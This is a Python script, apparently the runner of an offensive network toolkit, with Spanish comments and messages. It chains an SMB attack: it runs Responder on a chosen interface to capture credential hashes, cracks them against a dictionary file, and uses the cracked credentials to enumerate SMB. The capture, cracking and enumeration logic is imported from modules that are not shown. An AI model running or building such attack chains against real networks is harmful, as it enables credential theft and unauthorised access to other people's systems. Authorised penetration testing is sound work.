import sys
import os

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
ROOT_DIR = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
if ROOT_DIR not in sys.path:
    sys.path.insert(0, ROOT_DIR)

from modules.credential_capture import run_responder
from modules.hash_cracking import crack_hashes
from modules.advanced_enumeration import enumerate_with_credentials

def ejecutar_ataque_smb(interface, dictionary_path):
    print("[*] Lanzando ataque SMB: Responder + Crackeo + Enumeración")

    # Limpieza segura de hashes antiguos
    try:
        hashes_path = "results/hashes.txt"
        if os.path.exists(hashes_path):
            os.remove(hashes_path)
            print("[*] Hashes anteriores eliminados.")
    except Exception as e:
        print(f"[!] No se pudo limpiar hashes anteriores: {e}")

    try:
        run_responder(interface)
    except Exception as e:
        print(f"[!] Error al ejecutar Responder: {e}")
        return

    if not os.path.exists(hashes_path) or os.path.getsize(hashes_path) == 0:
        print("[-] No se capturaron nuevos hashes.")
        return

    try:
        credenciales = crack_hashes(hashes_path, dictionary_path)
        if not credenciales:
            print("[!] No se pudo crackear ningún hash.")
            return

        enumerate_with_credentials(credenciales)
        print("[✓] Enumeración SMB finalizada.")
    except Exception as e:
        print(f"[!] Error en el módulo SMB: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Uso: python3 smb_runner.py <INTERFAZ> <DICCIONARIO>")
        sys.exit(1)

    interfaz = sys.argv[1]
    diccionario = sys.argv[2]
    ejecutar_ataque_smb(interfaz, diccionario)